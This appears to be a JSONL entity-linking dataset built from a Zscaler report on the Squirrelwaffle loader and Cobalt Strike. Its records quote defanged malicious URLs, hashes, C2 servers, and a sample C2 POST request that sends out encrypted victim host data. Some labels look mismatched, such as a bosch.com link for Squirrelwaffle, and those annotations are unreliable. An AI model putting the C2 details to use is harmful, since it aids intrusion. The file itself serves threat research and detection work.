{"mention": "Squirrelwaffle", "context_left": "![Figure 14: Zscaler Cloud Sandbox detection of", "context_right": "Loader](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Sandbox%20report%20of%20loader.PNG)", "_context_left": "![Figure 14: Zscaler Cloud Sandbox detection of ", "_context_right": " Loader](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Sandbox%20report%20of%20loader.PNG)", "sentence_left": "-----------------------", "sentence_right": "Figure 14: Zscaler Cloud Sandbox detection of Squirrelwaffle Loader", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 14: Zscaler Cloud Sandbox detection of Squirrelwaffle Loader](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/Sandbox%20report%20of%20loader.PNG)", "_context_left": "![Figure 14: Zscaler Cloud Sandbox detection of Squirrelwaffle Loader](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/Sandbox%20report%20of%20loader.PNG)", "sentence_left": "-----------------------", "sentence_right": "Figure 14: Zscaler Cloud Sandbox detection of Squirrelwaffle Loader", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Figure 14: Zscaler Cloud Sandbox detection of", "context_right": "Loader", "_context_left": "Figure 14: Zscaler Cloud Sandbox detection of ", "_context_right": " Loader", "sentence_left": "![Figure 14: Zscaler Cloud Sandbox detection of Squirrelwaffle Loader](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Sandbox%20report%20of%20loader.PNG)", "sentence_right": "In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels including the signature shown below:", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Emotet", "context_left": "After the", "context_right": "botnet takedown earlier this year, criminal threat actors are filling that void.", "_context_left": "After the ", "_context_right": " botnet takedown earlier this year, criminal threat actors are filling that void.", "sentence_left": "----------", "sentence_right": "Squirrelwaffle appears to be a new loader taking advantage of this gap.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "", "context_right": "appears to be a new loader taking advantage of this gap.", "_context_left": "", "_context_right": " appears to be a new loader taking advantage of this gap.", "sentence_left": "After the Emotet botnet takedown earlier this year, criminal threat actors are filling that void.", "sentence_right": "It is not yet clear if Squirrelwaffle is developed and distributed by a known threat actor or a new group.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "It is not yet clear if", "context_right": "is developed and distributed by a known threat actor or a new group.", "_context_left": "It is not yet clear if ", "_context_right": " is developed and distributed by a known threat actor or a new group.", "sentence_left": "Squirrelwaffle appears to be a new loader taking advantage of this gap.", "sentence_right": "However, similar distribution techniques were previously used by Emotet.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Emotet", "context_left": "However, similar distribution techniques were previously used by", "context_right": ".", "_context_left": "However, similar distribution techniques were previously used by ", "_context_right": ".", "sentence_left": "It is not yet clear if Squirrelwaffle is developed and distributed by a known threat actor or a new group.", "sentence_right": "The Zscaler ThreatLabz team will continue to monitor this attack, as well as others, to help keep our customers safe.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "T1059 | Command and Scripting Interpreter", "context_left": "|", "context_right": "|", "_context_left": "| ", "_context_right": " |", "sentence_left": "| Tactic | Technique |", "sentence_right": "| T1592 | Gather Victim Host Information |", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "T1592 | Gather Victim Host Information", "context_left": "|", "context_right": "|", "_context_left": "| ", "_context_right": " |", "sentence_left": "| T1059 | Command and Scripting Interpreter |", "sentence_right": "| T1569 | System Services |", "label": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.). Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).", "label_id": 508, "label_title": "Gather Victim Host Information", "label_link": "https://attack.mitre.org/techniques/T1592", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "T1569 | System Services", "context_left": "|", "context_right": "|", "_context_left": "| ", "_context_right": " |", "sentence_left": "| T1592 | Gather Victim Host Information |", "sentence_right": "| T1137 | Office Application Startup |", "label": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.", "label_id": 107, "label_title": "System Services", "label_link": "https://attack.mitre.org/techniques/T1569", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "T1137 | Office Application Startup", "context_left": "|", "context_right": "|", "_context_left": "| ", "_context_right": " |", "sentence_left": "| T1569 | System Services |", "sentence_right": "| T1055 | Process Injection |", "label": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins. A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)", "label_id": 264, "label_title": "Office Application Startup", "label_link": "https://attack.mitre.org/techniques/T1137", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "T1055 | Process Injection", "context_left": "|", "context_right": "|", "_context_left": "| ", "_context_right": " |", "sentence_left": "| T1137 | Office Application Startup |", "sentence_right": "| T1140 | Deobfuscate/Decode Files or Information |", "label": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.", "label_id": 318, "label_title": "Process Injection", "label_link": "https://attack.mitre.org/techniques/T1055", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "T1140 | Deobfuscate/Decode Files or Information", "context_left": "|", "context_right": "|", "_context_left": "| ", "_context_right": " |", "sentence_left": "| T1055 | Process Injection |", "sentence_right": "| T1436 | Commonly Used Port |", "label": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016) Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)", "label_id": 514, "label_title": "Deobfuscate/Decode Files or Information", "label_link": "https://attack.mitre.org/techniques/T1140", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "T1436 | Commonly Used Port", "context_left": "|", "context_right": "|", "_context_left": "| ", "_context_right": " |", "sentence_left": "| T1140 | Deobfuscate/Decode Files or Information |", "sentence_right": "| T1437 | Standard Application Layer Protocol |", "label": "Adversaries may generate network traffic using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.", "label_id": 1666, "label_title": "Non-Standard Port", "label_link": "https://attack.mitre.org/techniques/T1509", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "T1437 | Standard Application Layer Protocol", "context_left": "|", "context_right": "|", "_context_left": "| ", "_context_right": " |", "sentence_left": "| T1436 | Commonly Used Port |", "sentence_right": "| T1106 | Native API |", "label": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the mobile device, and often the results of those commands, will be embedded within the protocol traffic between the mobile device and server.  Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS.", "label_id": 1603, "label_title": "Application Layer Protocol", "label_link": "https://attack.mitre.org/techniques/T1437", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "T1106 | Native API |", "context_left": "|", "context_right": "", "_context_left": "| ", "_context_right": "", "sentence_left": "| T1437 | Standard Application Layer Protocol |", "sentence_right": "Indicators of Compromise", "label": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations. Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. (Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC) Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation) Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API", "label_id": 65, "label_title": "Native API", "label_link": "https://attack.mitre.org/techniques/T1106", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "###", "context_right": "ZIP archive URLs", "_context_left": "### ", "_context_right": " ZIP archive URLs", "sentence_left": "------------------------", "sentence_right": "* hxxp://amaimaging[.]com/voluptas-quidem/documents.zip", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "###", "context_right": "Loader URLs", "_context_left": "### ", "_context_right": " Loader URLs", "sentence_left": "* hxxps://shivrajengineering[.]in/qui-dolores/placeat.zip", "sentence_right": "* hxxps://ghapan[.]com/Kdg73onC3oQ/090921.html", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "###", "context_right": "Word Document File MD5 Hashes", "_context_left": "### ", "_context_right": " Word Document File MD5 Hashes", "sentence_left": "* hxxps://fundacionverdaderosheroes[.]com/gY0Op5Jkht/sec.html", "sentence_right": "* 326498ae163f0d6b8a863d24793f152d", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "###", "context_right": "VBS File MD5 Hash", "_context_left": "### ", "_context_right": " VBS File MD5 Hash", "sentence_left": "* 5b50f7beabcff32bd02de2dda2766a7b", "sentence_right": "* 9da69f65ce4e8e57aef3ea1dd96f42ec", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "VBS", "context_left": "### Squirrelwaffle", "context_right": "File MD5 Hash", "_context_left": "### Squirrelwaffle ", "_context_right": " File MD5 Hash", "sentence_left": "* 5b50f7beabcff32bd02de2dda2766a7b", "sentence_right": "* 9da69f65ce4e8e57aef3ea1dd96f42ec", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "###", "context_right": "Loader MD5 Hashes", "_context_left": "### ", "_context_right": " Loader MD5 Hashes", "sentence_left": "* 9da69f65ce4e8e57aef3ea1dd96f42ec", "sentence_right": "* 7e9ba57db08f53b56715b0a8121bd839", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "### Domain used by the DLL for", "context_right": "CnC", "_context_left": "### Domain used by the DLL for ", "_context_right": " CnC", "sentence_left": "* 3ecc9ca5e744d7ddafa04834c70b95c3", "sentence_right": "* 107[.]180[.]12[.]15 port 80 centralfloridaasphalt[.]com", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike", "context_left": "###", "context_right": "Stager MD5 Hashes", "_context_left": "### ", "_context_right": " Stager MD5 Hashes", "sentence_left": "* 216[.]219[.]81[.]3 port 80 hrms[.]prodigygroupindia[.]com", "sentence_right": "* 116301fd453397fdf3cb291341924147", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike", "context_left": "###", "context_right": "CnC Servers", "_context_left": "### ", "_context_right": " CnC Servers", "sentence_left": "* ef799b5261fd69b56c8b70a3d22d5120", "sentence_right": "* 213.227.154[.]92:443/jquery-3.3.1.min.js", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* c27545fbb3b4ff35277bce1383655e46", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* a449e5044437c453fce2ead881aa8161", "sentence_right": "* c774e400b46f4c0bb90c11e349bc36a0", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://builtybybh-com[.]gq/eum-est/voluptas.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://builtbybh-com[.]gq/eum-est/voluptas.zip", "sentence_right": "* hxxps://cctvfiles[.]xyz/aliquam-ipsam/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "**eHp+fHZ7Q0ICAAUPQkUMcRYePyo5ORcrKiQ4LCkTCjo7CC4/KxceIConIiIoQkMHHw0CAhoKRkI=**", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "**Content-Length: 76**", "sentence_right": "Note that this request does not contain a User-Agent field in the HTTP header.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "For example, the file with an MD5 hash E599A656599A2680C9392C7329D9D519 has the filename diagram-346.doc.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "These documents follow a similar naming convention matching the regular expression diagram-\\d{2,3}.doc.", "sentence_right": "This document is using a DocuSign template lure that instructs the user to enable a macro to view the content (as shown in Figure 2).", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cloud Sandbox Detection", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "*hxxps://213.227.154.92/jquery-3.3.1.min.js*", "sentence_right": "-----------------------", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "*hxxps://cablingpoint[.]com/ByH5NDoE3kQA/pt.html*", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "*hxxps://bussiness-z[.]ml/ze8pCNTIkrIS/pt.html*", "sentence_right": "*hxxps://bonus.corporatebusinessmachines[.]co.in/1Y0qVNce/pt.html*", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://amaimaging[.]com/voluptas-quidem/ducimus.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://abogados-en-medellin[.]com/odit-error/documents.zip", "sentence_right": "* hxxps://builtbvbh-com[.]gq/eum-est/voluptas.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "September 28, 2021", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Squirrelwaffle: New Loader Delivering Cobalt Strike", "sentence_right": "Zscaler ThreatLabz has been following an emerging new malware loader known as Squirrelwaffle that is being used to deliver Cobalt Strike.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "**Host: test.dirigu.ro**", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "**POST /dXf4cS4GPL/fXMKNg0nKzN/DA15DggBI0N6dX1le310YXlkenw= HTTP/1.1**", "sentence_right": "**Content-Length: 76**", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 822e20c95df7165009600a9bfbff9b5e", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* db11964b27738bf4e3a1501e11bd54ad", "sentence_right": "* c1ed800a4ae9d4efd61de3aa7fd657b4", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://focus.focalrack[.]com/enim-rerum/ducimus.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://cctvfiles[.]xyz/aliquam-ipsam/documents.zip", "sentence_right": "* hxxps://inetworx.co[.]za/voluptate-sunt/est.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "**GEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t**", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "An example payload before encryption is shown below:", "sentence_right": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "------------------------", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "MITRE ATT&CK TTP Mapping", "sentence_right": "| Tactic | Technique |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://builtbvbh-com[.]gq/eum-est/voluptas.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://amaimaging[.]com/voluptas-quidem/ducimus.zip", "sentence_right": "* hxxps://builtbybh-com[.]gq/eum-est/voluptas.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://saraviatowing[.]net/et-praesentium/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://rinconadadellago[.]com.mx/qui-quia/documents.zip", "sentence_right": "* hxxp://shahanaschool[.]in/illum-accusamus/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
